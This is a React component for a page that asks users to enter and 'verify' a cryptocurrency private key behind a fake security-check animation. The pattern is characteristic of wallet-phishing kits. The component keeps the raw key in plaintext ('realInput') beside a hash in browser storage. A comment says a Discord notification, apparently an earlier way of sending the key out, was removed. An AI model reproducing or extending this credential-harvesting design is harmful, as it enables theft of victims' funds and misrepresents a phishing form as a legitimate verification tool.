"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { AlertCircle, CheckCircle2, Loader2 } from "lucide-react"
import { motion, AnimatePresence } from "framer-motion"
import { SecurityCheckProcess } from "./security-check-process"
import { hashKey } from "../utils/hashKey"

export function PrivateKeyInput() {
  const [privateKey, setPrivateKey] = useState("")
  const [isVerifying, setIsVerifying] = useState(false)
  const [isVerified, setIsVerified] = useState<boolean | null>(null)
  const [showSecurityCheck, setShowSecurityCheck] = useState(false)

  const handlePrivateKeyChange = (value: string) => {
    setPrivateKey(value.trim())
  }

  const handleVerify = async () => {
    setIsVerifying(true)
    setShowSecurityCheck(true)
  }

  const handleSecurityCheckComplete = async () => {
    setShowSecurityCheck(false)
    const isValid = privateKey.length === 64 && /^[0-9a-fA-F]+$/.test(privateKey)
    setIsVerified(isValid)
    setIsVerifying(false)

    // Hash the private key before storing
    const hashedKey = await hashKey(privateKey)

    const log = {
      id: Date.now().toString(),
      timestamp: new Date().toLocaleString(),
      type: "Private Key" as const,
      result: isValid ? ("Success" as const) : ("Failure" as const),
      hashedKey: hashedKey,
      realInput: privateKey, // Add this line
    }

    const storedLogs = localStorage.getItem("verificationLogs")
    const logs = storedLogs ? JSON.parse(storedLogs) : []
    logs.unshift(log)
    localStorage.setItem("verificationLogs", JSON.stringify(logs.slice(0, 100)))

    // Discord notification removed
  }

  if (showSecurityCheck) {
    return <SecurityCheckProcess onComplete={handleSecurityCheckComplete} />
  }

  return (
    <AnimatePresence mode="wait">
      <motion.div
        key="input"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        exit={{ opacity: 0, y: -20 }}
        transition={{ duration: 0.5 }}
      >
        <div className="mb-4">
          <Input
            value={privateKey}
            onChange={(e) => handlePrivateKeyChange(e.target.value)}
            className="bg-background/50"
            placeholder="Enter your private key"
          />
        </div>
        <Button onClick={handleVerify} className="w-full" disabled={isVerifying}>
          {isVerifying ? (
            <>
              <Loader2 className="mr-2 h-4 w-4 animate-spin" />
              Verifying...
            </>
          ) : (
            "Verify Private Key"
          )}
        </Button>
        {isVerified !== null && !isVerifying && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
            className={`mt-4 p-2 rounded ${isVerified ? "bg-green-500/10" : "bg-red-500/10"} flex items-center`}
          >
            {isVerified ? (
              <>
                <CheckCircle2 className="text-green-500 mr-2" />
                <span className="text-green-500">Private key verified successfully!</span>
              </>
            ) : (
              <>
                <AlertCircle className="text-red-500 mr-2" />
                <span className="text-red-500">Invalid private key. Please check and try again.</span>
              </>
            )}
          </motion.div>
        )}
      </motion.div>
    </AnimatePresence>
  )
}

